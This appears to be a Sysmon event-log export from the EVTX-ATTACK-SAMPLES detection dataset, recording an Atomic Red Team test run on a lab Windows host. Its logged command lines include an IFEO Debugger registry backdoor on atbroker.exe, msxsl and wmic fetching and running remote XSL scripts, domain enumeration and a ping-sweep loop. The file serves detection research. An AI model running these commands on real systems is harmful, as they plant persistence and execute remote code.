Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6016
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8AA-5D31-0000-0010C0C93200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:18.000
"
2019-07-19T14:50:19.467476+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3753,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6244
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8AB-5D31-0000-001054D03200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\atbroker.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:19.455
"
2019-07-19T14:50:19.491237+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3754,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\atbroker.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6244
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D8AB-5D31-0000-001054D03200
ProcessId: 5632
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8AB-5D31-0000-0010A5D23200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\atbroker.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:19.487
"
2019-07-19T14:50:19.516948+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3755,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 5632
ProcessGuid: 747F3D96-D8AB-5D31-0000-0010A5D23200
UtcTime: 2019-07-19 14:50:19.495
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:19.549321+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3756,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8AB-5D31-0000-0010A4D53200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:19.533
"
2019-07-19T14:50:50.046476+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3758,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4004
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8CA-5D31-0000-0010DA413300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Temp\msxsl.exe C:\AtomicRedTeam\atomics\T1220\src\msxslxmlfile.xml C:\AtomicRedTeam\atomics\T1220\src\msxslscript.xsl""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:50.029
"
2019-07-19T14:50:50.086593+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3759,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6268
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8CA-5D31-0000-0010CF443300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:50.067
"
2019-07-19T14:50:53.011281+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3760,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 948
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8CC-5D31-0000-001038513300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:52.989
"
2019-07-19T14:50:53.062635+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3761,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1852
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8CD-5D31-0000-001047543300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:53.038
"
2019-07-19T14:50:55.991996+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3762,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5380
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8CF-5D31-0000-00109B603300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wmic.exe process /FORMAT:list""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:55.978
"
2019-07-19T14:50:56.047770+00:00,Hacktool - EDR-Freeze Execution;Potential Process Reconnaissance via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3763,MSEDGEWIN10,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wmic.exe process /FORMAT:list""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5380
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=4004528344D02FD143DAFD94BFE056041B633E0D,MD5=390B2038C9ED2C94AB505921BC827FC7,SHA256=34C4ED50A3441BD7CB6411749771C637A8C18C791525D8FCB5AE71B0B1969BA6,IMPHASH=AF8CD6625FCE3244397EE550EFF4091E
ParentProcessGuid: 747F3D96-D8CF-5D31-0000-00109B603300
ProcessId: 7040
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8D0-5D31-0000-0010F3623300
CommandLine: wmic.exe  process /FORMAT:list
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:56.021
"
2019-07-19T14:50:56.182990+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3764,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 396
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8D0-5D31-0000-001034673300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:56.162
"
2019-07-19T14:51:06.728089+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3765,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5340
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8DA-5D31-0000-0010D3833300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wmic.exe process /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:06.714
"
2019-07-19T14:51:06.753240+00:00,Hacktool - EDR-Freeze Execution;Potential Process Reconnaissance via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3766,MSEDGEWIN10,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wmic.exe process /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5340
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=4004528344D02FD143DAFD94BFE056041B633E0D,MD5=390B2038C9ED2C94AB505921BC827FC7,SHA256=34C4ED50A3441BD7CB6411749771C637A8C18C791525D8FCB5AE71B0B1969BA6,IMPHASH=AF8CD6625FCE3244397EE550EFF4091E
ParentProcessGuid: 747F3D96-D8DA-5D31-0000-0010D3833300
ProcessId: 3220
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8DA-5D31-0000-001029863300
CommandLine: wmic.exe  process /FORMAT:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:51:06.748
"
2019-07-19T14:51:06.888030+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3767,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4016
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8DA-5D31-0000-00100D8A3300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:06.873
"
2019-07-19T14:51:09.823311+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3768,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4856
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8DD-5D31-0000-0010EF923300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""net view /domain""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:09.804
"
2019-07-19T14:51:09.845415+00:00,Hacktool - EDR-Freeze Execution;Share And Session Enumeration Using Net.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3769,MSEDGEWIN10,"Image: C:\Windows\System32\net.exe
RuleName: ''
Description: Net Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""net view /domain""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4856
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=4F4970C3545972FEA2BC1984D597FC810E6321E0,MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: 747F3D96-D8DD-5D31-0000-0010EF923300
ProcessId: 3012
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8DD-5D31-0000-001043953300
CommandLine: net  view /domain
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:51:09.839
"
2019-07-19T14:51:22.314203+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3770,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1988
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8EA-5D31-0000-001030B63300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""net view""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:22.302
"
2019-07-19T14:51:22.333688+00:00,Hacktool - EDR-Freeze Execution;Share And Session Enumeration Using Net.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3771,MSEDGEWIN10,"Image: C:\Windows\System32\net.exe
RuleName: ''
Description: Net Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""net view""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1988
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=4F4970C3545972FEA2BC1984D597FC810E6321E0,MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: 747F3D96-D8EA-5D31-0000-001030B63300
ProcessId: 4684
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8EA-5D31-0000-00108AB83300
CommandLine: net  view
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:51:22.330
"
2019-07-19T14:51:34.797834+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3772,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3344
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8F6-5D31-0000-00100FCB3300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:34.779
"
2019-07-19T14:51:35.014760+00:00,Hacktool - EDR-Freeze Execution;Suspicious Scan Loop Network;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3773,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4528
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %%i in (1,1,254) do ping -n 1 -w 100 192.168.1.%%i""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:51:34.991
"
